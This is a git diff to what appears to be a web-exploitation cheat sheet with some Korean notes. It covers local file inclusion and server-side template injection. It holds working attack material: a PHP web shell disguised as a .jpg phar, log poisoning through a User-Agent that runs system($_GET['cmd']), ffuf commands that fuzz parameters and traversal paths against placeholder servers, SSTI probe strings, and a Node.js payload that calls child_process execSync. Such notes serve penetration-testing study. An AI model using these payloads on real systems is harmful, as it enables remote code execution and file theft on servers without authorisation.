@@ -267,6 +267,47 @@ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
 - `/var/log/apache2/`, `C:\xampp\apache\logs\`, `/var/log/nginx/`, `C:\nginx\log\`, `proc/self/environ`, `/proc/self/fd/<pid>`,`/var/log/sshd.log`, `/var/log/mail`,`/var/log/vsftpd.log`
 ```bash
 echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
+
 curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
 ```
 <img width="1265" height="598" alt="image" src="https://github.com/user-attachments/assets/9673d26a-6ded-46df-8d67-b7b9e7bf1422" />
+
+# automated
+- https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt
+- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt
+- https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt
+- https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
+- https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
+## Fuzzing parameter
+```bash
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
+```
+## LFI wordlist
+```bash
+ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
+```
+
+## Fuzzing server
+```bash
+ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
+```
+
+## Fuzzing log
+```bash
+ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+```
+
+# SSTI
+```html
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+${{7*7}}
+#{7*7}
+*{7*7}
+```
+- `Node.JS`에서는 `process`객체는 무조건적으로 존재한다.
+- SSTI 공격에서는 동기 함수로는 제대로 된 응답을 받을 수 없다.
+```js
+process.mainModule.require('child_process').execSync('whoami')
+```
